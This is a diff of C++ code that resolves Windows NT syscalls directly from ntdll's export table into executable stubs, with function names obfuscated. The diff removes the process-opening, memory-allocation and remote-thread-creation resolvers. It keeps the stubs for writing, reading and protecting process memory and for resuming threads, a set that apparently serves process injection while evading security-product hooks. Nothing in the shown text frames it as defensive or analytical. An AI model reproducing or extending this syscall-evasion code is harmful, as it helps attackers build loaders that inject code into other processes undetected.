@@ -13,12 +13,6 @@ using namespace std;
 
 int const SYSCALL_STUB_SIZE = 21;
 
-MyNtOpenProcess _NtOpenProcess = NULL;
-char OpenProcStub[SYSCALL_STUB_SIZE] = {};
-
-MyNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
-char AllocStub[SYSCALL_STUB_SIZE] = {};
-
 MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
 char WVMStub[SYSCALL_STUB_SIZE] = {};
 
@@ -27,9 +21,6 @@ char RVMStub[SYSCALL_STUB_SIZE] = {};
 
 MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
 char ProtectStub[SYSCALL_STUB_SIZE] = {};
-
-MyNtCreateThreadEx _NtCreateThreadEx = NULL;
-char CreateThreadExStub[SYSCALL_STUB_SIZE];
 
 MyNtResumeThread _NtResumeThread = NULL;
 char ResumeThreadStub[SYSCALL_STUB_SIZE];
@@ -56,47 +47,6 @@ BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LP
 		}
 	}
 
-	return FALSE;
-}
-
-BOOL FindOpenProc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
-{
-	DWORD oldProtection;
-	_NtOpenProcess = (MyNtOpenProcess)(LPVOID)OpenProcStub;
-	BOOL status = VirtualProtect(OpenProcStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-	if (MapSyscall(AY_OBFUSCATE("NtOpenProcess"), exportDirectory, fileData, textSection, rdataSection, OpenProcStub))
-	{
-		return TRUE;
-	}
-	return FALSE;
-}
-
-HANDLE CallOpenProc(DWORD pid)
-{
-	// variables for NtOpenProcess
-	HANDLE hProcess = NULL;
-	OBJECT_ATTRIBUTES zoa;
-	InitializeObjectAttributes(&zoa, NULL, NULL, NULL, NULL, NULL);
-	CLIENT_ID targetPid = { 0 };
-	targetPid.UniqueProcess = (void*)pid;
-	NTSTATUS success = NULL;
-	success = _NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &zoa, &targetPid);
-	if (success != 0)
-		return NULL;
-
-	return hProcess;
-}
-
-BOOL FindAlloc(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
-{
-	DWORD oldProtection;
-	_NtAllocateVirtualMemory = (MyNtAllocateVirtualMemory)(LPVOID)AllocStub;
-	VirtualProtect(AllocStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	if (MapSyscall(AY_OBFUSCATE("NtAllocateVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, AllocStub))
-	{
-		return TRUE;
-	}
 	return FALSE;
 }
 
@@ -137,20 +87,6 @@ BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fi
 	{
 		return TRUE;
 	}
-	return FALSE;
-}
-
-BOOL FindCreateThreadEx(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection)
-{
-	DWORD oldProtection;
-	_NtCreateThreadEx = (MyNtCreateThreadEx)(LPVOID)CreateThreadExStub;
-	VirtualProtect(CreateThreadExStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
-
-	if (MapSyscall(AY_OBFUSCATE("NtCreateThreadEx"), exportDirectory, fileData, textSection, rdataSection, CreateThreadExStub))
-	{
-		return TRUE;
-	}
-
 	return FALSE;
 }
 
@@ -201,17 +137,11 @@ BOOL EstablishSyscalls()
 	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);
 
 	// Assign Syscall values
-	if (!FindOpenProc(exportDirectory, fileData, textSection, rdataSection))
-		success = FALSE;
-	if (!FindAlloc(exportDirectory, fileData, textSection, rdataSection))
-		success = FALSE;
 	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
 	if (!FindReadVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
 	if (!FindProtectVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
-		success = FALSE;
-	if (!FindCreateThreadEx(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
 	if (!FindResumeThread(exportDirectory, fileData, textSection, rdataSection))
 		success = FALSE;
